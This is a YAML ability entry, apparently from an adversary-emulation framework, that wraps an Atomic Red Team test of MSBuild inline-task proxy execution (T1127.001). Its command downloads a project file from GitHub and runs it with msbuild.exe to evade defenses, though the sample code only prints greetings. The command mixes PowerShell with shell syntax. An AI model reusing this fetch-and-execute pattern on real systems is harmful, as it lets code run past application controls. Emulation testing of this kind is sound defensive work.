- id: 58742c0f-cb01-44cd-a60b-fb26e8871c93
  name: MSBuild Bypass Using Inline Tasks (C#)
  description: Executes the code in a project file using msbuild.exe. The default
    C# project example file (T1127.001.csproj) will simply print "Hello From a Code
    Fragment" and "Hello From a Class." to the screen.
  tactic: defense-evasion
  technique:
    attack_id: T1127.001
    name: 'Trusted Developer Utilities Proxy Execution: MSBuild'
  platforms:
    windows:
      sh:
        command: 'if (Test-Path "PathToAtomicsFolder\T1127.001\src\T1127.001.csproj")
          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
          "PathToAtomicsFolder\T1127.001\src\T1127.001.csproj") -ErrorAction ignore
          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj"
          -OutFile "PathToAtomicsFolder\T1127.001\src\T1127.001.csproj"; fi; C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
          "PathToAtomicsFolder\T1127.001\src\T1127.001.csproj"'
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - defense-evasion
  - t1127.001
  author: Atomic Red Team
  additional_info:
    input_arguments:
      filename:
        description: Location of the project file
        type: path
        default: PathToAtomicsFolder\T1127.001\src\T1127.001.csproj
      msbuildpath:
        description: Default location of MSBuild
        type: path
        default: C:\Windows\Microsoft.NET\Framework\v4.0.30319
      msbuildname:
        description: Default name of MSBuild
        type: path
        default: msbuild.exe
